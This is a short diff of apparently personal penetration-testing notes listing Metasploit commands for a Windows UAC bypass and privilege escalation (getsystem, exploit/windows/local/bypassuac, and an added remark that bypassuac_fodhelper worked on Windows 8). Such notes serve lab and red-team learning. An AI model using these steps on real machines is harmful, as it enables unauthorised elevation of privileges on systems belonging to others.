@@ -57,7 +57,7 @@ cn_windows_7_professional_x64_dvd_x15-65791.iso   2009-08-26
 getsystem
 background
 search bypassuac
-use exploit/windows/local/bypassuac
+use exploit/windows/local/bypassuac                            win8  yongzhege  exploit/windows/local/bypassuac_fodhelper    tiquanchengong 
 set SESSION 1
 run
 成功得到  session2 
